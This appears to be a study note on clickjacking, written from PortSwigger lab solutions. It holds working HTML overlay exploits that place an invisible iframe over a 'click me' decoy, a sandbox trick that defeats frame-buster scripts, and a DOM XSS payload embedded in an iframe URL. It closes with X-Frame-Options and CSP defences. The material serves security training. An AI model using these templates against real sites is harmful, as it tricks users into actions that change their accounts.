
- Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a *decoy website*.

## Example

A web user accesses a decoy website (perhaps this is a link provided by an email) and clicks on a button to win a prize. Unknowingly, they have been deceived by an attacker into pressing an alternative hidden button and this results in the payment of an account on another site. This is an example of a clickjacking attack. The technique depends upon the incorporation of an invisible, actionable web page (or multiple pages) containing a button or hidden link, say, within an iframe. The iframe is overlaid on top of the user's anticipated decoy web page content but it''s made almost invisible. Hence, the victim will see the decoy web page, but it'll click on the target website (iframe). 

```html
<head> 
<style> 
#target_website { 
position:relative; 
width:128px; 
height:128px; 
opacity:0.00001; 
z-index:2; 
} 

#decoy_website { 
position:absolute; 
width:300px; 
height:400px; 
z-index:1; 
} 
</style> 
</head> 
<body> 
<div id="decoy_website"> ...decoy web content here... </div> 
<iframe id="target_website" src="https://vulnerable-website.com"> </iframe> </body>
```


## Labs

###### Lab: Basic clickjacking with CSRF token protection
```html
<style>
    iframe {
        position:relative;
        width: 1920px;
        height: 780px;
        opacity: 0.000001;
        z-index: 2;
    }
    div {
font-size: 20px;
        position:absolute;
        top:535px;
        left:445px;
        z-index: 1;
    }
</style>
<div>click me</div>
<iframe src="https://0a99002403a82a3d81c7d43500da00b0.web-security-academy.net/my-account"></iframe>
```

###### Lab: Clickjacking with form input data prefilled from a URL parameter
```html
<style>
    iframe {
        position:relative;
        width: 1920px;
        height: 1080px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
font-size: 25px;
        position:absolute;
        top: 484px;
        left: 430px;
        z-index: 1;
    }
</style>
<div>click me</div>
<iframe src="https://0a5100a403a6d62180838f4b006d00fd.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

#### Frame busting scripts

Clickjacking attacks are possible whenever websites can be framed (displaying one website within another website’s frame, using HTML frames or iframes, that are inline frames). Therefore, preventative techniques are based upon restricting the framing capability for websites. A common client-side protection enacted through the web browser is to use **frame busting** or **frame breaking scripts**.
Scripts are often crafted so that they perform some or all of the following behaviors:

- check and enforce that the current application window is the main or top window
- make all frames visible
- prevent clicking on invisible frames
- intercept and flag potential clickjacking attacks to the user

Frame busting techniques are often browser and platform specific and because of the flexibility of HTML they can usually be circumvented by attackers. As frame busters are JavaScript then the browser's security settings may prevent their operation or indeed the browser might not even support JavaScript. An effective attacker workaround against frame busters is to use the HTML5 iframe `sandbox` attribute. When this is set with the `allow-forms` or `allow-scripts` values (and the `allow-top-navigation` value is omitted) then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:

`<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>`

###### Lab: Clickjacking with a frame buster script
```html
<style>
    iframe {
        position:relative;
        width: 1920px;
        height: 1080px;
        opacity: 0.5;
        z-index: 0.0001;
    }
    div {
font-size: 25px;
        position:absolute;
        top: 484px;
        left: 430px;
        z-index: 1;
    }
</style>
<div>click me</div>
<iframe src="https://0aa500aa0337f271826c43d7000200de.web-security-academy.net/my-account?email=hacky@yahoo.it" sandbox="allow-forms"></iframe>
```

### Combining clickjacking with a DOM XSS attack

The true potency of clickjacking is revealed when it is used as a carrier for another attack such as a **DOM XSS attack**. After the attacker has  identified the XSS exploit, then it can be combined with the iframe target URL so that the user clicks on the button or link and consequently executes the DOM XSS attack.

###### Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS
```html
<style>
    iframe {
        position:relative;
        width: 1920px;
        height: 1080px;
        opacity: 0.5;
        z-index: 2;
    }
    div {
	    font-size: 25px;
        position:absolute;
        top: 835px;
        left: 430px;
        z-index: 1;
    }
</style>
<div>click me</div>
<iframe src="https://0a1a00fa04b6229380bf675000e1007c.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&subject=sub&message=mexx&email=ema@gmail.com"></iframe>
```


###### Lab: Multistep clickjacking
```html
<style>
    iframe {
        position:relative;
        width: 1920px;
        height: 1080px;
        opacity: 0.0001;
        z-index: 2;
    }
    #click1 {
font-size: 25px;
        position:absolute;
        top: 530px;
        left: 430px;
        z-index: 1;
    }

#click2 {
font-size: 25px;
        position:absolute;
        top: 327px;
        left: 600px;
        z-index: 1;
    }
</style>
<div id="click1">Click me first</div>
<div id="click2">Click me next</div>
<iframe src="https://0ac400e303e1a1518085fd370058003c.web-security-academy.net/my-account"></iframe>
```

## Prevention

- Frame busting (but it can be bypassed!)
- Add headers to disable malicious framing: the header **X-Frame-Options** provides the website owner with control over the use of iframes or objects so that inclusion of a web page within a frame can be prohibited with the `deny` directive:

	`X-Frame-Options: deny`

	Alternatively, framing can be restricted to the same origin as the website using the `sameorigin` directive:

	`X-Frame-Options: sameorigin`

	or to a named website using the `allow-from` directive:

	`X-Frame-Options: allow-from https://normal-website.com`

- Use CSP to disable framing. The CSP provides the client browser with information about permitted sources of web resources that the browser can apply to the detection and interception of malicious behaviors.

	The recommended clickjacking protection is to incorporate the `frame-ancestors` directive in the application's Content Security Policy. The `frame-ancestors 'none'` directive is similar in behavior to the X-Frame-Options `deny` directive. The `frame-ancestors 'self'` directive is broadly equivalent to the X-Frame-Options `sameorigin` directive.
	Alternatively, framing can be restricted to named sites:

	`Content-Security-Policy: frame-ancestors normal-website.com;`

- Use SameSite flag for cookies


## Clickjacking vs [CSRF](CSRF%20(Cross-Site%20Request%20Forgery).md)

This attack differs from a CSRF attack in that the user is required to perform an action such as a button click whereas a CSRF attack depends upon forging an entire request without the user's knowledge or input.
